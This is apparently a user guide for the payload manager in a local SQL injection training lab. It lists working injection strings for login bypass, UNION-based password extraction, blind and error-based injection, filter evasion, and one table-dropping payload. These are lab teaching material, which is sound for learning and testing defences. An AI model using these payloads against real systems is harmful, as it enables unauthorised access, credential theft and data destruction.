# Payload Management Guide

## Overview
The SQL Injection Lab now includes an interactive payload management system that allows users to add, edit, delete, and use common SQL injection payloads across all vulnerability levels.

## Features

### 1. **View Payloads**
- Click "Show Payloads" to display all available SQL injection payloads
- Each payload is displayed in a code block format
- Click any payload to automatically fill the username field with that payload

### 2. **Manage Payloads**
- Click "Manage" to enable payload management mode
- Hover over any payload to see edit and delete options
- Management options appear as small icons (✏️ for edit, 🗑️ for delete)
- Reset button appears to restore default payloads

### 3. **Add New Payloads**
- When in management mode, use the "Add New Payload" section
- Type your custom SQL injection payload in the input field
- Press Enter or click "Add" to add the payload
- Duplicate payloads are automatically prevented
- **New payloads are automatically saved to your browser!**

### 4. **Edit Existing Payloads**
- Click the edit icon (✏️) next to any payload
- The payload becomes editable in an input field
- Press Enter to save or Escape to cancel
- Use the ✓ and ✗ buttons to save or cancel changes
- **Edits are automatically saved to your browser!**

### 5. **Delete Payloads**
- Click the delete icon (🗑️) next to any payload
- The payload is immediately removed from the list
- No confirmation dialog (be careful!)
- **Deletions are automatically saved to your browser!**

### 6. **🆕 Persistent Storage**
- All changes are automatically saved to your browser's localStorage
- Payloads persist across page refreshes and browser sessions
- Changes are maintained when navigating between levels
- Your custom payloads will be available until you clear browser data

### 7. **🆕 Reset Functionality**
- Click the "Reset" button (appears when in manage mode)
- Instantly restores all payloads to factory defaults
- Clears your custom additions and modifications
- Useful for starting fresh or undoing unwanted changes

## Default Payloads Included

The system comes pre-loaded with common SQL injection payloads:

1. `' OR '1'='1' --` - Basic boolean-based bypass
2. `' OR 1=1 --` - Numeric boolean-based bypass
3. `admin' --` - Username-based bypass
4. `' UNION SELECT username, password FROM users --` - UNION-based attack
5. `' OR username='admin' --` - Conditional bypass
6. `1' OR '1'='1` - Alternative boolean bypass
7. `'; DROP TABLE users; --` - Destructive payload (for testing)
8. `' OR SLEEP(5) --` - Time-based blind injection
9. Complex UNION payload for information extraction

## Usage Examples

### Adding Custom Payloads
```sql
-- Time-based blind injection variants
' OR (SELECT SLEEP(5)) --
' UNION SELECT NULL, SLEEP(5) --

-- Error-based injection
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --

-- Boolean-based blind injection
' AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users LIMIT 1)>64 --

-- UNION-based data extraction
' UNION SELECT table_name, column_name FROM information_schema.columns --
```

### Editing Existing Payloads
1. Click the edit icon next to a payload
2. Modify the SQL injection syntax
3. Save with Enter or the ✓ button
4. Test the modified payload by clicking on it

## Best Practices

### For Learning
- Start with basic payloads and gradually try more complex ones
- Understand what each payload does before using it
- Test payloads on different levels to see varying protections

### For Testing
- Keep a variety of payload types (boolean, UNION, time-based, error-based)
- Organize payloads by complexity and technique
- Document successful payloads for different scenarios

### For Security Research
- Add payloads specific to your target database (PostgreSQL in this lab)
- Include both basic and advanced evasion techniques
- Test bypass methods for different input validation approaches

## Payload Categories

### 1. **Authentication Bypass**
```sql
' OR '1'='1' --
admin' --
' OR username='admin' --
```

### 2. **Data Extraction (UNION-based)**
```sql
' UNION SELECT username, password FROM users --
' UNION SELECT table_name, column_name FROM information_schema.columns --
```

### 3. **Blind Injection (Time-based)**
```sql
' OR SLEEP(5) --
' AND (SELECT pg_sleep(5)) --
```

### 4. **Blind Injection (Boolean-based)**
```sql
' AND 1=1 --
' AND (SELECT LENGTH(username) FROM users LIMIT 1)>0 --
```

### 5. **Error-based Injection**
```sql
' AND CAST((SELECT version()) AS INT) --
' UNION SELECT CAST(COUNT(*) AS CHAR) FROM users --
```

### 6. **Advanced Evasion**
```sql
'/**/OR/**/'1'='1'/**/--
' OR 'x'='x
' OR ASCII(SUBSTRING(@@version,1,1))>50 --
```

## Level-Specific Considerations

### Level 1 (No Protection)
- Any payload should work
- Good for learning basic injection techniques

### Level 2-6 (Increasing Protection)
- Some payloads may be filtered
- Use the management system to create variations
- Test bypass techniques for input validation

### Impossible Level
- All payloads should fail
- Use this to test your strongest evasion attempts
- Verify that proper defenses are in place

## Persistence Note
- Payload changes persist during your session
- Refresh the page to reset to default payloads
- Consider saving important custom payloads externally

## 🆕 Data Persistence & Management

### Automatic Saving
- **localStorage Integration**: All payload modifications are automatically saved to your browser's localStorage
- **Cross-Session Persistence**: Your custom payloads remain available even after:
  - Page refreshes (F5, Ctrl+F5)
  - Browser restarts
  - Navigating between different levels
  - Computer restarts (until browser data is cleared)

### Storage Details
- **Storage Key**: `sql-injection-payloads`
- **Storage Type**: Browser localStorage (client-side only)
- **Data Format**: JSON array of payload strings
- **Size Limit**: ~5-10MB (depends on browser)

### Managing Your Data

#### Viewing Stored Data
You can inspect your saved payloads using browser DevTools:
1. Press `F12` to open DevTools
2. Go to `Application` tab
3. Navigate to `Local Storage` → `http://localhost:3000`
4. Look for the key `sql-injection-payloads`

#### Backing Up Your Payloads
```javascript
// Run this in browser console to export your payloads
const payloads = localStorage.getItem('sql-injection-payloads');
console.log(payloads); // Copy this output to save externally
```

#### Restoring Payloads
```javascript
// Run this in browser console to import payloads
const myPayloads = ['payload1', 'payload2', '...']; // Your payload array
localStorage.setItem('sql-injection-payloads', JSON.stringify(myPayloads));
location.reload(); // Refresh to see changes
```

#### Manual Reset Options
1. **UI Reset**: Use the "Reset" button in the payload manager
2. **Browser Reset**: Clear browser data for the site
3. **Console Reset**: Run `localStorage.removeItem('sql-injection-payloads')` in browser console

### Data Privacy & Security
- **Local Only**: Data is stored only in your browser, never sent to servers
- **No Cross-Device Sync**: Payloads don't sync across different devices/browsers
- **Privacy-Safe**: No personal data is collected or stored

## Security Warning
⚠️ **Important**: Only use these payloads in controlled environments like this lab. Using SQL injection payloads against systems you don't own or don't have permission to test is illegal and unethical.

## Troubleshooting

### Payload Not Working?
1. Check if the level has input validation
2. Try URL encoding special characters
3. Test different comment styles (-- vs /**/)
4. Verify the payload syntax is correct

### Management Features Not Showing?
1. Ensure you're on a vulnerable level (not "impossible")
2. Click "Show Payloads" first
3. Then click "Manage" to enable management mode

### Can't Add Payload?
1. Check if the payload already exists
2. Ensure the input field is not empty
3. Verify there are no syntax errors

## Additional Resources
- Check `SQLMAP_GUIDE.md` for automated testing
- See level-specific documentation for defense mechanisms
- Review `manual-level1-test.bat` for example attacks

---
*Last updated: December 2024*
